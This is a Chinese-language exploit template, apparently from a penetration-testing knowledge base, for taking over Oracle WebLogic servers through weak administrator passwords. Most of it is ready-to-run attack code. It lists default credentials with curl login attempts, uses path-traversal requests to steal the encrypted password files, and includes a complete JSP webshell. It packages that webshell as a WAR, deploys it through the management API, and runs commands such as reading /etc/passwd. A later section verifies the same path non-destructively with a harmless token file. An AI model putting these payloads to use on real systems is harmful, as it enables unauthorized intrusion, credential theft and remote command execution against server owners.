---
id: WEBLOGIC-WEAK-UPLOAD
title: WebLogic 弱口令后台部署 War 包 getshell
product: weblogic
vendor: Oracle
version_affected: "all versions with console enabled"
severity: HIGH
tags: [rce, 需要认证]
fingerprint: ["WebLogic", "weblogic", "Oracle WebLogic", "Error 404--Not Found"]
---

## 漏洞描述

WebLogic 管理控制台使用弱口令时，攻击者可登录后台并通过部署功能上传包含 JSP webshell 的 WAR 包，获取服务器命令执行权限。此外，如果攻击者已通过文件读取漏洞获取到 WebLogic 的 `SerializedSystemIni.dat` 和 `config.xml` 文件，可解密其中加密存储的管理员密码，进而登录控制台完成部署。

## 影响版本

- Oracle WebLogic 所有版本（启用管理控制台）

## 前置条件

- 需要认证（弱口令或通过其他漏洞获取密码）
- 需要能够访问 WebLogic 管理控制台端口（默认 7001）
- 管理控制台未禁用

## 利用步骤

1. 探测 WebLogic 管理控制台是否可访问
2. 使用常见弱口令尝试登录，或通过文件读取漏洞获取加密密码并解密
3. 登录管理控制台后，通过部署功能上传包含 JSP webshell 的 WAR 包
4. 访问部署的 webshell 执行命令

## Payload

```bash
# ========== 阶段1: 探测和登录 ==========

# 确认管理控制台可访问
curl -s -o /dev/null -w "%{http_code}" "http://target:7001/console/"

# 常见弱口令列表
# weblogic / Oracle@123
# weblogic / weblogic
# weblogic / weblogic1
# weblogic / welcome1
# weblogic / weblogic123
# system / password
# admin / security

# 使用 curl 尝试弱口令登录
curl -s -c cookies.txt -L \
  -d "j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8" \
  "http://target:7001/console/j_security_check" \
  -o /dev/null -w "%{http_code}"
# 返回 302 且跳转到 console.portal 说明登录成功

curl -s -c cookies.txt -L \
  -d "j_username=weblogic&j_password=weblogic&j_character_encoding=UTF-8" \
  "http://target:7001/console/j_security_check" \
  -o /dev/null -w "%{http_code}"

curl -s -c cookies.txt -L \
  -d "j_username=weblogic&j_password=weblogic1&j_character_encoding=UTF-8" \
  "http://target:7001/console/j_security_check" \
  -o /dev/null -w "%{http_code}"

# ========== 阶段1.5: 如果有文件读取漏洞，解密密码 ==========

# 通过文件读取漏洞获取加密密码（需配合 CVE-2022-21371 或其他文件读取漏洞）
# 读取 SerializedSystemIni.dat（二进制文件，需保存）
curl -s "http://target:7001/.//WEB-INF/../../../security/SerializedSystemIni.dat" -o SerializedSystemIni.dat

# 读取 config.xml 获取加密的密码
curl -s "http://target:7001/.//WEB-INF/../../../config/config.xml" | grep -A2 "credential-encrypted"

# 使用 WebLogic 密码解密工具
# https://github.com/TideSec/Decrypt_Weblogic_Password
python3 decrypt_weblogic_password.py SerializedSystemIni.dat "{AES256}xxxxxxxx..."

# ========== 阶段2: 制作 WAR 包 ==========

# 创建 JSP webshell
mkdir -p webshell_dir
cat > webshell_dir/cmd.jsp << 'JSPEOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
JSPEOF

# 打包为 WAR 文件
cd webshell_dir && jar -cvf ../webshell.war * && cd ..

# ========== 阶段3: 部署 WAR 包 ==========

# 方式A: 通过 WebLogic REST API 部署（需要认证 cookie）
# 先登录获取 cookie
curl -s -c cookies.txt -L \
  -d "j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8" \
  "http://target:7001/console/j_security_check"

# 通过 REST 管理接口上传部署
curl -b cookies.txt \
  -H "X-Requested-By: weblogic" \
  -H "Accept: application/json" \
  -F "model={name: 'webshell', targets: [{identity: [servers, 'AdminServer']}]}" \
  -F "sourcePath=@webshell.war" \
  "http://target:7001/management/wls/latest/deployments/application"

# 方式B: 通过 wlst/REST 部署（WebLogic 12c+）
curl -b cookies.txt \
  -H "X-Requested-By: weblogic" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "webshell",
    "targets": ["AdminServer"],
    "isLibrary": false
  }' \
  "http://target:7001/management/weblogic/latest/edit/appDeployments"

# ========== 阶段4: 访问 webshell ==========

# 执行命令
curl -s "http://target:7001/webshell/cmd.jsp?cmd=id"
curl -s "http://target:7001/webshell/cmd.jsp?cmd=whoami"
curl -s "http://target:7001/webshell/cmd.jsp?cmd=cat+/etc/passwd"
```

## 验证方法

```bash
# 1) 弱口令：登录后取到登录态，而不是只看跳转
curl -s -c cookies.txt \
  -d "j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8" \
  "http://target:7001/console/j_security_check" -o /dev/null
grep -i "JSESSIONID\|ADMINCONSOLESESSION" cookies.txt
# 判据：登录接口返回了 WebLogic 的会话 cookie（ADMINCONSOLESESSION / JSESSIONID），且带着它请求控制台能拿到后台框架页
# 反例：302 到 console.portal 也可能是跳回登录页；cookie 文件为空或只有 j_security_check 的失败重定向，都算没登录进去

# 2) 无损落地验证：不解 shell，先传一个只有标记的文本文件，再 GET 回读
mkdir -p poc && echo "POC_TOKEN" > poc/poc.txt
cd poc && jar -cf ../poc.war poc.txt && cd ..
curl -s -b cookies.txt -H "X-Requested-By: weblogic" \
  -F "model={name:'poc',targets:[{identity:[servers,'AdminServer']}]}" \
  -F "sourcePath=@poc.war" \
  "http://target:7001/management/wls/latest/deployments/application"
curl -s "http://target:7001/poc/poc.txt"
# 判据：GET 回读到的响应体就是本次上传的 POC_TOKEN，说明部署链路可写、可访问
# 清理：控制台 undeploy 该应用，或走 REST 删除 /management/wls/latest/deployments/application/poc
# 反例：回读到 404/403，或只拿到部署状态 JSON（那只证明接口收下请求，不证明文件可达）

# 3) 确认部署记录里确实有本次应用
curl -s -b cookies.txt -H "X-Requested-By: weblogic" -H "Accept: application/json" \
  "http://target:7001/management/wls/latest/deployments/application" | grep -o '"name":"poc"'
```

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target:7001/console/"
curl -s "http://target:7001/console/" | grep -i "WebLogic"
curl -s "http://target:7001/" | grep -i "Error 404--Not Found"
```

## 参考链接

- https://github.com/TideSec/Decrypt_Weblogic_Password
